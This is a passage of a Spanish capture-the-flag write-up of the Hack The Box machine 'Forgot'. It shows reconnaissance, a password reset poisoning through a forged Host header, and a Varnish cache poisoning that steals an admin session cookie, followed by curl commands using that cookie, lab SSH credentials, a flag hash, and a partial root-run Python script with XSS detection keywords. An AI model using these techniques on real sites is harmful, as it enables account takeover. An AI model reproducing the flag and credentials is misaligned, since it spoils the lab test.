---
title: "HTB: Resolución de Forgot"
date: 2023-03-04 16:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [cache poisoning, password reset poisoning, python code injection]     ## TAG names should always be lowercase
image: forgot.jpg
img_path: /photos/2023-03-01-Forgot-WriteUp/
---

***Forgot*** es una máquina ***Linux*** con dos servicios expuestos: *SSH* y *HTTP*. Primero, explotaremos un ***Password Reset Poisoning*** para **restablecer** la **contraseña** del usuario *robert-dev-14529*. Posteriormente, conseguiremos obtener la *cookie* de sesión del usuario *admin* a través de un ***Web Cache Poisoning***. Autenticados como *admin*, encontraremos las **credenciales** *SSH* del usuario *diego* en un *endpoint* de la página web. Para conseguir **máximos privilegios**, podremos ejecutar como *root* un archivo en *python*, que contiene una vulnerabilidad asociada a la librería *tensorflow* de **inyección de código**.

## Clasificación de dificultad de la máquina

![imagen 1](stats.png)

## Reconocimiento

### ping

Mandamos un _ping_ a la máquina víctima, con la finalidad de conocer su sistema operativo y saber si tenemos conexión con la misma. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_ y un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.

```bash
$> ping -c 1 10.10.11.188 

PING 10.10.11.188 (10.10.11.188) 56(84) bytes of data.
64 bytes from 10.10.11.188: icmp_seq=1 ttl=63 time=92.5 ms

--- 10.10.11.188 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 92.470/92.470/92.470/0.000 ms
```

Comprobamos que nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.

### Port Discovery

Procedemos a escanear todo el rango de puertos de la máquina víctima, con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo hacemos con la herramienta ***nmap***.

```bash
$> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.11.188 -oG allPorts

Nmap scan report for 10.10.11.188
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**-oG** exportará la evidencia en formato _grepeable_ al fichero *allPorts* en este caso.

Hemos encontrado **dos puertos abiertos**, el **22** y el **80**. Un **puerto abierto** está **escuchando solicitudes de conexión entrantes**.

Vamos a lanzar una serie de _scripts_ básicos de enumeración, en busca de los **servicios** que están corriendo y de sus **versiones**.

```bash
$> nmap -sCV -p22,80 10.10.11.188 -oN targeted

Nmap scan report for 10.10.11.188
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
|_http-title: Login
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 27 Feb 2023 21:15:59 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 14812999
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 27 Feb 2023 21:15:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 3704632
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 27 Feb 2023 21:15:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     X-Varnish: 14812995
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=2/27%Time=63FD1D8B%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1E4,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.1\.2\x2
SF:0Python/3\.8\.10\r\nDate:\x20Mon,\x2027\x20Feb\x202023\x2021:15:53\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:20219\r\nLocation:\x20http://127\.0\.0\.1\r\nX-Varnish:\x203704632\r\nA
SF:ge:\x200\r\nVia:\x201\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\
SF:x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecti
SF:ng\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x2
SF:0redirected\x20automatically\x20to\x20the\x20target\x20URL:\x20<a\x20hr
SF:ef=\"http://127\.0\.0\.1\">http://127\.0\.0\.1</a>\.\x20If\x20not,\x20c
SF:lick\x20the\x20link\.\n")%r(HTTPOptions,11A,"HTTP/1\.1\x20200\x20OK\r\n
SF:Server:\x20Werkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2027\x
SF:20Feb\x202023\x2021:15:53\x20GMT\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length:\x200
SF:\r\nX-Varnish:\x2014812995\r\nAge:\x200\r\nVia:\x201\.1\x20varnish\x20\
SF:(Varnish/6\.2\)\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:FourOhFourRequest,1C1,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20W
SF:erkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2027\x20Feb\x20202
SF:3\x2021:15:59\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x20207\r\nX-Varnish:\x2014812999\r\nAge:\x200\r\nVia:\
SF:x201\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x20close\r\n\r\n<
SF:!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title
SF:>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20f
SF:ound\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20
SF:manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\
SF:.</p>\n")%r(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El puerto **22** es **SSH** y el puerto **80** **HTTP**. 

Las **tecnologías** que se están empleando en la **página web** (puerto 80) son las siguientes:

* *Werkzeug/2.1.2 Python/3.8.10* indica que el servidor que está sirviendo la aplicación web está utilizando la biblioteca *Werkzeug* de *Python* versión **2.1.2** y *Python* versión **3.8.10**.
* *Varnish/6.2* se refiere a la versión de *Varnish Cache,* un servidor *proxy* de caché de código abierto y de alta velocidad que se utiliza comúnmente para mejorar el rendimiento de sitios web y aplicaciones web.

De momento, al no disponer de credenciales para autenticarnos por _SSH_, nos centraremos en auditar el puerto **80**.

### Puerto 80 abierto (HTTP)

#### Tecnologías empleadas

En primer lugar, utilizaremos **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:

![imagen 2](Pasted image 20230227223119.png)

Muestra las mismas tecnologías que el *script* anterior de *nmap*: como servidor web se está empleando *Werzeug* y *Python* y como servidor *proxy* de caché *Varnish*, concretamente la versión *6.2*.

#### Investigando web

Al acceder a *http://10.10.11.188* vemos lo siguiente:

![imagen 3](Pasted image 20230227224605.png)

Se trata de un **panel de inicio de sesión**. Podríamos intentar explotar algún ataque del tipo *SQL Injection*, pero no obtendríamos el resultado esperado. Inspeccionando el código fuente de la página (*Ctrl+u*), encontramos una cadena interesante:

![imagen 4](Pasted image 20230227224746.png)

En la **línea 169**, descubrimos el nombre de usuario *robert-dev-14529*. 

La página principal dispone de un botón llamado *FORGOT THE PASSWORD?* Dicho botón nos lleva a *http://10.10.11.188/forgot*:

![imagen 5](Pasted image 20230227224707.png)

Esta funcionalidad se podría utilizar para **enumerar usuarios**, ya que la respuesta del servidor varía dependiendo de si el usuario existe o no. Por ejemplo, si introducimos un usuario llamado *test*, la respuesta del servidor es *Invalid Username*:

![imagen 6](Pasted image 20230227225816.png)

En cambio, si introducimos un **nombre de usuario válido**, como el que encontramos anteriormente, el servidor nos contesta con:

![imagen 7](Pasted image 20230227224954.png)

Debido a la lentitud del servidor, no es buena idea llevar a cabo una enumeración de usuarios por fuerza bruta. Aparte de esto, es interesante el **mensaje del servidor cuando el usuario existe**: se ha enviado un *link* al usuario para restablecer la contraseña. 

En este punto, vamos a *fuzzear* directorios a ver si encontramos alguno interesante.

#### Fuzzing de directorios

**Buscaremos directorios** que se encuentren bajo la URL `http://10.10.11.188/`. Lo haremos con la herramienta *gobuster*:

```bash
gobuster dir -u http://10.10.11.188/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.188/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/27 22:46:47 Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 302) [Size: 189] [--> /]
/login                (Status: 200) [Size: 5189]       
/forgot               (Status: 200) [Size: 5227]       
/tickets              (Status: 302) [Size: 189] [--> /]
/reset                (Status: 200) [Size: 5523]       
   
===============================================================
2023/02/27 22:49:00 Finished
===============================================================
```

**dir** para indicar que queremos aplicar *fuzzing* de directorios.  
**-u** para especificar la _url_.  
**-w** para especificar el diccionario. Para _fuzzear_ directorios siempre suele emplear el mismo, _directory-list-2.3-medium.txt_. Este diccionario se puede encontrar en el propio _Parrot OS_ o en _Kali_. También se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  

Descubrimos el directorio */reset*, que tiene pinta de ser el que se utiliza para **restablecer las contraseñas de los usuarios**. El aspecto de *http://10.10.11.188/reset* es el siguiente:

![imagen 8](Pasted image 20230227231032.png)

Nos encontramos con los dos campos típicos de **restablecimiento de contraseñas**. Ahora bien, para cambiar la contraseña de un usuario, necesitaremos **disponer de algún valor que lo identifique**. En este caso, parece que necesitaremos un *token* de identificación:

![imagen 9](Pasted image 20230227225047.png)

Habiendo encontrado un **usuario válido** y el *endpoint* de restablecimiento de contraseñas, podríamos intentar **envenenar una solicitud de restablecimiento de contraseña**, para que *robert-dev-14529*, al hacer clic en el enlace que envía el servidor a su *inbox*, nos envíe el *token* de identificación y podamos **cambiar su contraseña**. Este ataque se conoce como ***Password reset poisoning***

## Consiguiendo shell como diego

### Password reset poisoning

#### Concepto

El ataque *Password Reset Poisoning (PRP)* es una técnica de ataque que tiene como objetivo obtener el control de una cuenta de usuario al explotar una vulnerabilidad en el proceso de recuperación de contraseña. 

En algunos casos, el proceso de restablecimiento de contraseñas funciona de la siguiente forma:

* Un usuario tramita una **solicitud de restablecimiento de su contraseña**.
* El servidor le envía un *link* al correo para poder restablecerla. Para generar este *link*, el servidor utiliza la **IP** que se encuentra en la **cabecera *host***, que es la IP de la página web. A la URL también se le añade un parámetro que identifique al usuario.
* El usuario **clica** en el *link*, y es redirigido a un *endpoint* de la página web donde podrá restablecer su contraseña.

Es en el proceso de **solicitud de restablecimiento de contraseña** donde entra el atacante. La siguiente imagen ilustra perfectamente este ataque:


![imagen 10](Pasted image 20230227232454.png)

Imagen extraída de [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).

1. Un usuario **envía** una **solicitud** de **restablecimiento de la contraseña**.
1. El **atacante** **intercepta** la solicitud, y **cambia** el valor de la **cabecera *host*** por su IP. Posteriormente, el atacante deja fluir la petición, esta llega al servidor y el **servidor envía un correo al usuario**.
2. El **usuario**, al hacer **clic** en el **enlace** para cambiar su contraseña, en vez de ser redirigido a la página web, tramitará una **petición** *GET* al **servidor web del atacante**. 
3. El atacante interceptará la petición *GET* y utilizará el *token* para cambiar la contraseña del usuario.

Es importante destacar que, **para explotar esta vulnerabilidad**, **se necesita la interacción de otra persona**, que es la que clicará en el enlace que le enviará el servidor para restablecer la contraseña.

#### Explotación

Dicho lo anterior, primero viajaremos a *http://10.10.11.188/forgot* y **enviaremos una solicitud de restablecimiento de contraseña** para el usuario *robert-dev-14529*. Interceptaremos la petición con *BurpSuite*:

![imagen 11](Pasted image 20230227234217.png)

La petición tiene el siguiente aspecto:

![imagen 12](Pasted image 20230227234321.png)

**Cambiaremos el valor de la cabecera *Host* por nuestra IP de atacante**, en mi caso es la *10.10.14.130*:

![imagen 13](Pasted image 20230227234434.png)

Antes de enviar la solicitud, nos pondremos en escucha con *netcat*, por ejemplo:

![imagen 14](Pasted image 20230227234723.png)

Dejamos fluir la petición. Pasado un tiempo, *robert-dev-14529* entrará en su *inbox*, clicará en el enlace y **recibiremos una solicitud** ***GET***:

![imagen 15](Pasted image 20230227234514.png)

Finalmente, utilizaremos el *token* de identificación para restablecer la contraseña de *robert-dev-14529*. El *token* es:

```bash
3Tli5nTeHPmUgEBmyQyGqmMEIfDIp%2BHW3wN4uMbWNqSuxTktTfu4CxKNDxfXLg3HuA6TGTCzrVuXoCcjdTBrsw%3D%3D
```

Viajaremos a *http://10.10.11.188/reset?token=3Tli5nTeHPmUgEBmyQyGqmMEIfDIp%2BHW3wN4uMbWNqSuxTktTfu4CxKNDxfXLg3HuA6TGTCzrVuXoCcjdTBrsw%3D%3D* (en mi caso) y *resetearemos* la contraseña de *robert-dev-14529*. Si todo ha ido bien, deberíamos ver el mensaje *Success* en la parte inferior:

![imagen 16](Pasted image 20230227235048.png)

En mi caso, las credenciales de acceso serán `robert-dev-14529:r1pfr4n`.

### Investigando Support Portal

Nos **autenticamos en el panel de inicio de sesión** y deberíamos ver la siguiente imagen:

![imagen 17](Pasted image 20230227235521.png)

La web ofrece **dos funcionalidades** interesantes. En *http://10.10.11.188/tickets* encontramos *tickets* tramitados por usuarios, algunos de los cuales están pendientes de ser escalados:

![imagen 18](Pasted image 20230228000057.png)

*http://10.10.11.188/escalate* ofrece la posibilidad de crear un nuevo *ticket*:

![imagen 19](Pasted image 20230228000114.png)

Los **parámetros** que se envían por *POST* al tramitar un nuevo *ticket* son los siguientes:

![imagen 20](Pasted image 20230228000315.png)

El servidor nos responde con el mensaje *Escalation form submitted to Admin and will be reviewed soon!*. Es posible que el creador de la máquina haya implementado un *bot* que represente al usuario *admin* y revise la solicitud. Si este usuario, además de **revisar la solicitud**, **clica en el enlace** del parámetro *link*, se podría intentar **explotar** algún **ataque**.

En el caso de escribir una URL en el parámetro *link*, este **solo acepta la IP de la máquina víctima**. Si escribimos la nuestra, por ejemplo, recibiremos el siguiente mensaje de **error**:

![imagen 21](Pasted image 20230228000338.png)

El *home* también nos muestra otro botón llamado *Tickets (Escalated)*, pero está deshabilitado. Si inspeccionamos el código fuente de *home* (*Ctrl+u*), encontraremos el *URI* al que nos debería redirigir el botón si estuviese activado:

![imagen 22](Pasted image 20230228225248.png)

Si clicamos en */admin_tickets*, el servidor nos redirige a la página principal:

![imagen 23](Pasted image 20230228225535.png)

Seguramente, necesitaremos disponer de una **cuenta de administrador** para poder ver el contenido de *http://10.10.11.188/admin_tickets*. 

En este punto, vamos a intentar explotar alguna **vulnerabilidad en la tramitación de un nuevo *ticket***. Sabemos, por el reconocimiento del principio, que el servidor está utilizando un **web caché** llamado *Varnish*. Si el administrador **visualiza** el *ticket* que subimos y además **clica** en el enlace del parámetro *url*, podemos intentar explotar un *cache poisoning*.


### Varnish Cache Poisoning

#### Contexto

El **envenenamiento de caché web** es una estrategia sofisticada que utiliza un atacante para aprovechar el funcionamiento de un **servidor web y su caché**, con el fin de enviar una respuesta *HTTP* maliciosa a otros usuarios. 

Para comprender cómo surgen las vulnerabilidades de intoxicación de caché web, es importante tener una **comprensión básica de cómo funcionan las cachés web**.

Si un servidor tuviera que enviar **una nueva respuesta a cada solicitud HTTP por separado**, esto probablemente **sobrecargaría** el **servidor**, lo que resultaría en **problemas de latencia** y una mala experiencia para el usuario, especialmente durante períodos de alta actividad. La **caché** es principalmente un **medio para reducir tales problemas**.

La **caché** se encuentra **entre el servidor y el usuario**, donde **guarda** (almacena en caché) las **respuestas a solicitudes particulares**, generalmente durante un período de tiempo determinado. Si **otro usuario** luego **envía una solicitud equivalente**, la **caché** simplemente **sirve una copia** de la respuesta en caché directamente al usuario, sin interacción del *back-end.* Esto alivia en gran medida la carga en el servidor al reducir la cantidad de solicitudes duplicadas que tiene que manejar.

La siguiente imagen ilustra el funcionamiento de las **cachés web**:

![imagen 24](Pasted image 20230228213714.png)


Imagen extraída de [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning). 

1. El usuario amarillo realiza una petición a la web. La petición llega a la caché y esta determina si hay una respuesta cacheada que pueda servir a esta petición. Como no la hay, la petición es enviada al servidor. Posteriormente, se cachea la respuesta.
2. El usuario azul y rosa, tramitan una petición a la web. La caché determina que estas dos peticiones son equivalentes a la solicitud que tramitó el usuario amarillo y, por tanto, sirve la respuesta que cacheó el usuario amarillo.

Para saber si dos **solicitudes** son **equivalentes**, **las cachés web utilizan las llaves** (*cache keys*). Normalmente, para saber si dos solicitudes son equivalentes, las cachés comparan la cabecera *Host* y la **línea de la solicitud**. Aquellos componentes de la solicitud que no son comparados se les atribuye el nombre de *unkeyed* (sin clave).

Una **caché web envenenada** puede ser potencialmente un medio **devastador para distribuir numerosos tipos de ataques**, aprovechando vulnerabilidades como *XSS*, *inyección de JavaScript*, *Open Redirect*, y otros similares.

#### Pre-Explotación

Vamos a fijarnos en las **cabeceras de respuesta** del servidor cuando estamos autenticados:

![imagen 25](Pasted image 20230228231717.png)

Esto es un ejemplo de una petición al *home* cuando estamos autenticados. El **servidor nos devuelve** en la **cabecera *Set-Cookie*** el valor de nuestra ***cookie*** de sesión. Esto es importante para la explotación de este ataque.

**Para explotar un cache poisoning**, debemos encontrar *endpoints* que se cacheen. Como ejemplo de *endpoint* que no se cachea podemos utilizar *http://10.10.11.188/home*. Las cabeceras de respuesta de esta solicitud son las siguientes:

![imagen 26](Pasted image 20230301213807.png)

-   La línea `X-Varnish` es una identificación del objeto almacenado en caché.
-   La línea `Age` indica el tiempo en segundos desde que el objeto se almacenó en caché. Como la respuesta de esta solicitud no estaba en caché, el valor es *0*.

Vamos a volver a tramitar la misma solicitud:

![imagen 27](Pasted image 20230301213827.png)

- La línea `X-Varnish` es una identificación del objeto almacenado en caché.
- La línea `Age` sigue teniendo el valor *0*. Esto quiere decir que la respuesta de esta petición no estaba cacheada. En otras palabras, el *web cache* ha considerado que esta solicitud y la anterior **no son equivalentes**.

Este *endpoint* no se cachea y por tanto no nos sirve para explotar la vulnerabilidad.

Ahora vamos a fijarnos en *http://10.10.11.188/static*. Este directorio existe en la *web*. Podemos encontrar varias referencias a este directorio en el código fuente de la página principal:

![imagen 28](Pasted image 20230301000200.png)

Fijémonos en las cabeceras de respuesta cuando tramitamos una solicitud a *http://10.10.11.188/static*:

![imagen 29](Pasted image 20230301214036.png)

El valor `Age` empieza valiendo *0*, pero si vuelvo a tramitar la misma petición:

![imagen 30](Pasted image 20230301214119.png)

Ahora vale **48**. Esto quiere decir que el *web cache* cacheó una solicitud equivalente a esta hace 48 segundos (es la solicitud anterior) y nos ha servido la misma respuesta. En otras palabras, el *web cache* ha considerado que esta solicitud y la anterior **son equivalentes**.

La *web caché* se comporta de la misma forma con todos los archivos y directorios dentro de *http://10.10.11.188/static*, como *http://10.10.11.188/static/test* o *http://10.10.11.188/static/js*.

Ya para acabar y dar paso a la explotación, vamos a llevar a cabo una especie de *Prove Of Concept* con el usuario **robert-dev-14529**. Este usuario tramita una petición a *http://10.10.11.188/static/PoC*:

![imagen 31](Pasted image 20230301214630.png)

`Age: 0` quiere decir que no había ninguna respuesta cacheada ligada a esta solicitud. Para comprobar si se ha cacheado, volvemos a enviar la misma solicitud:

![imagen 32](Pasted image 20230301214710.png)

`Age: 118`. Efectivamente, la solicitud anterior se había cacheado hace 118 segundos y nos han servido la misma respuesta. 

Pues bien, si ahora accedemos al mismo *endpoint* sin estar autenticados, deberíamos ver en la respuesta la *cookie* del usuario *robert-dev-14529*:

![imagen 33](Pasted image 20230301215007.png)

El *web cache* ha considerado que esta solicitud y las dos anteriores son **equivalentes** y nos ha enviado la misma respuesta. Esto sucede porque el *web cache* no está considerando la cabecera *Cookie* como *chache key*, y por tanto, no utiliza esta cabecera para determinar si dos solicitudes son iguales o diferentes. De este modo, hemos conseguido la *cookie* del usuario *robert-dev-14529* **sin estar autenticados en la web**. El proceso de explotación será lo mismo que hemos hecho ahora, pero la petición la tramitará el administrador y seremos capaces de conseguir su *cookie*.

#### Explotación

Después de este pequeño inciso, imaginemos que el administrador, autenticado, visita un *endpoint* de la página web que **no** está **cacheado**, por ejemplo, *http://10.10.11.188/static/uarepwneed*. La petición viajará al servidor y posteriormente **se cacheará la respuesta**. Recordemos que si un usuario está autenticado, la respuesta enviará la *cookie* del usuario. La caché suministrará esta respuesta a aquellas solicitudes que considere que son **equivalentes**. Por lo tanto, si enviamos una solicitud al mismo *endpoint* y el *web cache* considera que la **solicitud** es **equivalente** a la que envió el administrador, el *web cache* nos enviará la respuesta cacheada con la *cookie* del administrador. Si los *chache keys* son el *host* y la **línea de solicitud**, la solicitud del administrador y la nuestra deberían ser consideradas equivalentes.

Seguiremos los siguientes pasos:

1. Tramitamos una petición *POST* a *http://10.10.11.188/escalate*. Modificaremos el parámetro *url* a *http://10.10.11.188/static/uarepwneed*, por ejemplo:

![imagen 34](Pasted image 20230301220927.png)

2. Ahora debemos esperar unos 3 minutos. El **administrador accederá** al *ticket*, visitará la *url* y como la respuesta de la solicitud no está cacheada, será cacheada por el *web cache*. 

**IMPORTANTE**: para que la solicitud sea cacheada por el administrador, es importante no acceder a la *http://10.10.11.188/static/uarepwneed*, ya que si no, la cachearemos nosotros y no se guardará en caché la respuesta de la solicitud del administrador, que es la que contiene la *cookie* del administrador.

3. Pasados los 3 minutos, ejecutamos el siguiente comando:

```bash
curl -I http://10.10.11.188/static/uarepwneed
```

Las cabeceras de respuesta son las siguientes:

![imagen 35](Pasted image 20230301220746.png)

Vemos una *cookie* diferente a la de nuestro usuario. El administrador accedió a *http://10.10.11.188/static/uarepwneed* hace 160 segundos. El *web cache* ha determinado que nuestra solicitud y la del administrador son equivalentes y nos ha proporcionado la **respuesta que cacheó el administrador**. La *cookie* de sesión del administrador es la siguiente:

```bash
Set-Cookie: session=80a4d8f7-4b2b-46aa-99d0-d034da7c0eea; HttpOnly; Path=/
```

Recordemos que, como el usuario *robert-dev-14529*, no teníamos acceso a */admin_tickets*. Vamos a utilizar la *cookie* anterior para acceder:

```bash
curl -H "cookie: session=80a4d8f7-4b2b-46aa-99d0-d034da7c0eea" http://10.10.11.188/admin_tickets -s | html2text
```

* `html2text` lo he utilizado para interpretar el *html*.

La respuesta del servidor es la siguiente:

![imagen 36](Pasted image 20230301221048.png)

Nos comparten las **credenciales SSH** del usuario *diego*: `diego:dCb#1!x0%gjq`. 

Finalmente, nos conectamos por *SSH*:

![imagen 37](Pasted image 20230301003657.png)

### user.txt

Podemos encontrar la primera *flag* en el *homedir* del usuario *diego*:

```bash
diego@forgot:~$ cat user.txt 
56c0aead00efbebc78eb72982e084f40
```

## Consiguiendo shell como root

### Reconocimiento del sistema

#### sudoers

El usuario *diego* tiene asignado el siguiente privilegio a nivel de *sudoers*:

![imagen 38](Pasted image 20230301003850.png)

Puede ejecutar como *root*, sin proporcionar contraseña, */opt/security/ml_secrutiy.py*.

#### Inspeccionando ml_secrutiy.py

El contenido de *ml_secrutiy.py* es el siguiente:

```python
#!/usr/bin/python3
import sys
import csv
import pickle
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

np.random.seed(42)

f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'

## load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")

## Create a function to convert an array of strings to a set of features
def getVec(text):
    features = []
    for i, line in enumerate(text):
        test_data = word_tokenize(line.lower())
        v1 = model.infer_vector(test_data)
        featureVec = v1
        lineDecode = unquote(line)
        lowerStr = str(lineDecode).lower()
        feature1 = int(lowerStr.count('link'))
        feature1 += int(lowerStr.count('object'))
        feature1 += int(lowerStr.count('form'))
        feature1 += int(lowerStr.count('embed'))
        feature1 += int(lowerStr.count('ilayer'))
        feature1 += int(lowerStr.count('layer'))
        feature1 += int(lowerStr.count('style'))
        feature1 += int(lowerStr.count('applet'))
        feature1 += int(lowerStr.count('meta'))
        feature1 += int(lowerStr.count('img'))
        feature1 += int(lowerStr.count('iframe'))
        feature1 += int(lowerStr.count('marquee'))
        ## add feature for malicious method count
        feature2 = int(lowerStr.count('exec'))
        feature2 += int(lowerStr.count('fromcharcode'))
        feature2 += int(lowerStr.count('eval'))
        feature2 += int(lowerStr.count('alert'))
        feature2 += int(lowerStr.count('getelementsbytagname'))
        feature2 += int(lowerStr.count('write'))
        feature2 += int(lowerStr.count('unescape'))
        feature2 += int(lowerStr.count('escape'))
        feature2 += int(lowerStr.count('prompt'))
        feature2 += int(lowerStr.count('onload'))
        feature2 += int(lowerStr.count('onclick'))
        feature2 += int(lowerStr.count('onerror'))
        feature2 += int(lowerStr.count('onpage'))
        feature2 += int(lowerStr.count('confirm'))
        ## add feature for ".js" count
        feature3 = int(lowerStr.count('.js'))
        ## add feature for "javascript" count
        feature4 = int(lowerStr.count('javascript'))
        ## add feature for length of the string
        feature5 = int(len(lowerStr))
        ## add feature for "<script"  count
        feature6 = int(lowerStr.count('script'))
        feature6 += int(lowerStr.count('<script'))
        feature6 += int(lowerStr.count('&lt;script'))
        feature6 += int(lowerStr.count('%3cscript'))
        feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
        ## add feature for special character count
        feature7 = int(lowerStr.count('&'))
        feature7 += int(lowerStr.count('<'))
        feature7 += int(lowerStr.count('>'))
        feature7 += int(lowerStr.count('"'))
        feature7 += int(lowerStr.count('\''))
        feature7 += int(lowerStr.count('/'))
        feature7 += int(lowerStr.count('%'))
        feature7 += int(lowerStr.count('*'))
        feature7 += int(lowerStr.count(';'))
        feature7 += int(lowerStr.count('+'))
        feature7 += int(lowerStr.count('='))
        feature7 += int(lowerStr.count('%3C'))
        ## add feature for http count
        feature8 = int(lowerStr.count('http'))
        
        ## append the features
        featureVec = np.append(featureVec,feature1)
        featureVec = np.append(featureVec,feature2)
        featureVec = np.append(featureVec,feature3)
        featureVec = np.append(featureVec,feature4)
        featureVec = np.append(featureVec,feature5)
        featureVec = np.append(featureVec,feature6)
        featureVec = np.append(featureVec,feature7)
        featureVec = np.append(featureVec,feature8)
        features.append(featureVec)
    return features


## Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
conn.close()
data=[]
for i in r:
        data.append(i)
Xnew = getVec(data)

#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
